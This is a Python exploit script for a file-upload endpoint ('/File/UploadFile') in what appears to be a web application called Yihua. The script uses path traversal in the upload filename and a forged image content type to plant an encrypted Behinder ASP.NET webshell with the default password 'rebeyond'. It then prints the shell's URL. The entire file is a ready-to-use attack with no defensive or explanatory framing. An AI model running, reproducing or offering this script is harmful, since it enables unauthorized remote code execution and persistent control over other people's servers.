import requests,sys,re
import warnings
import random
def main():
    warnings.filterwarnings('ignore')  # 忽略SSL警告
    if len(sys.argv)<2:
        print("Usage: python3 yihua_exp.py url")
    else:
        url=sys.argv[1]
        ex(url)
def ex(urls):
    try:
        if 'http' not in urls:
            urls='http://'+urls
        filename=''
        zf='1234567890qwertyuiopasdfghjklzxcvbnm'
        for _ in range(8):
            suiji1=random.randint(0,len(zf)-1)
            filename+=zf[suiji1]
        if urls[-1]=='/':
            url = urls + "File/UploadFile"
        else:
            url = urls + "/File/UploadFile"

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'multipart/form-data; boundary=---------------------------21909179191068471382830692394',
            'Connection': 'close',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        body=f'''
-----------------------------21909179191068471382830692394\r
Content-Disposition: form-data; name="file"; filename="../../../{filename}.aspx"\r
Content-Type: image/jpeg\r
\r
<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b"); /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>\r
-----------------------------21909179191068471382830692394\r
Content-Disposition: form-data; name="action"\r
\r
unloadfile\r
-----------------------------21909179191068471382830692394\r
Content-Disposition: form-data; name="filepath"\r
\r
./\r
-----------------------------21909179191068471382830692394\r
'''
        body=body.encode('utf-8')
        r=requests.post(url=url,data=body,headers=headers)
        shell_url=urls+'/'+filename+'.aspx'
        print("上传冰蝎马成功，webshell地址为："+shell_url+",密码为rebeyond")
    except:
        print('[!]   '+url+'连接失败')
if __name__ == '__main__':
    main()